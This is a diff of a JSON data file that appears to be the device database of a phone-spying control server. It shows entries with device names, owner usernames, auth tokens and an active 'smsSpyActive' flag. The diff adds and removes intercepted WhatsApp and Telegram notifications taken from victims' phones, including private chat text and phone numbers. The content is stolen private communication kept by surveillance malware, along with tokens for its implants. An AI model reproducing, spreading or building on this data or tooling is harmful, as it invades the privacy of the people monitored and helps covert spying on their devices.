@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776775591847,
+    "lastSeen": 1776775594870,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3733 pesan dari 23 chat",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775593561
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎STOCK¹ NEW DAVID 18 STR X OWN (80 pesan): ~ fikal Lai",
+        "content": "📷 FORMAT JUAL AKUN BY FIKAL STORE\n \n(`BUKAN AKUN ADMIN`)\n\nNO SELLER:088289440706\nNAMA : mpruy suka sawit\nAKUN : ff\nSPEK : vk fyo\nLOG :ggl\nHARGA :harting\n*MC. fikal bau tai \n\n`WA REKBER FIKAL STORE:` 085761226876\nNOTE\n \n-SETIAP PEMBELIAN AKUN WAJIB MEMAKAI REKBER AGAR UANG KALIAN AMAN\n\n- JANGAN MAU DIAJAK DIRECT/SIS P KALAU JAPOST",
+        "time": "21/04 19:46",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775593319
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -10312,22 +10328,6 @@
         "time": "21/04 19:20",
         "pkg": "com.whatsapp",
         "receivedAt": 1776774022767
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (40 pesan): diga",
-        "content": ".",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774022746
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3581 pesan dari 23 chat",
-        "time": "21/04 19:20",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776774018252
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775590570,
+    "lastSeen": 1776775593971,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10387,7 +10387,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776775590452,
+    "lastSeen": 1776775593556,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -10403,6 +10403,110 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "OPEN MURUNLIMIT TELE 8K, MINAT? PV @Pallzyo99",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594871
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "Davii・5872 pesan baru dari 48 obrolan",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594831
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "😃 Stiker",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594807
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "❌ Gagal membuat panel\nGagal buat user: The email has already been taken.",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594786
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: Rose",
+        "content": "JANGAN LUPA START DULU DI PRIVATE BOT NYET",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594764
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "OPEN MURUNLIMIT TELE 8K, MINAT? PV @Pallzyo99",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594634
+      },
+      {
+        "appName": "Telegram",
+        "sender": "./j4X¡tsme な #sa #flory 🎖️",
+        "content": "Fs Noktel \nId 1 r9k (2) nomin \nId 1 malay scam r? Dm\n@j4Xxzw",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594575
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16744 pesan baru dari 115 obrolan",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775594451
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Telegram",
+        "content": "❄️ Akun Terhapuss・16744 pesan baru dari 115 obrolan",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775593627
+      },
+      {
+        "appName": "Telegram",
+        "sender": "𝗞𝗮𝘁𝗶𝗹 𝗩𝗜𝗣 𝗣𝗿𝗲𝗱𝗶𝗰𝘁𝗶𝗼𝗻 📈",
+        "content": "😃 Stiker",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775592872
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PANEL PRIVATE WANZ: WantidCpanel_bot",
+        "content": "❌ Gagal membuat panel\nGagal buat user: The email has already been taken.",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775592811
+      },
+      {
+        "appName": "Telegram",
+        "sender": "GB PUBLIC FREE PANEL: Rose",
+        "content": "JANGAN LUPA START DULU DI PRIVATE BOT NYET",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775592739
+      },
+      {
+        "appName": "Telegram",
+        "sender": "Hàblàr sobrè la muèrte",
+        "content": "OPEN MURUNLIMIT TELE 8K, MINAT? PV @Pallzyo99",
+        "time": "21/04 19:46",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1776775592671
+      },
       {
         "appName": "Telegram",
         "sender": "./j4X¡tsme な #sa #flory 🎖️",
@@ -14298,110 +14402,6 @@
         "time": "21/04 19:09",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776773362315
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: Indonesia 🇮🇩\n• Server: Server (4)\n• Nomor: +6285*******61\n• Waktu: 21/04/2026, 19.09",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362277
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16637 pesan baru dari 114 obrolan",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362248
-      },
-      {
-        "appName": "Telegram",
-        "sender": "ᴛᴇʟᴇᴋᴏꜱ ꜱᴛᴏʀᴇ",
-        "content": "🎉 PEMBELIAN NOMOR BERHASIL:\n————————————–––––——––•\n• Layanan Aplikasi: Whatsapp\n• Negara: UK 🇬🇧\n• Server: Server (4)\n• Nomor: +4473******92\n• Waktu: 21/04/2026, 19.00",
-        "time": "21/04 19:09",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776773362080
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773361028
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "[ suendi ]",
-        "content": "Pesan baru dari 1 chat",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773360066
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "bintang",
-        "content": "Berdering…",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773348600
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "bintang",
-        "content": "Memanggil…",
-        "time": "21/04 19:09",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773347170
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Kijup",
-        "content": "Menyukai status Anda",
-        "time": "21/04 19:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773253790
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Kijup",
-        "content": "Menyukai status Anda",
-        "time": "21/04 19:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773253719
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke Status saya",
-        "time": "21/04 19:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773222650
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke Status saya",
-        "time": "21/04 19:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773222196
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke Status saya",
-        "time": "21/04 19:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773221946
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "Mengirim video ke Status saya",
-        "time": "21/04 19:07",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773221827
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776775591123,
+    "lastSeen": 1776775594123,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
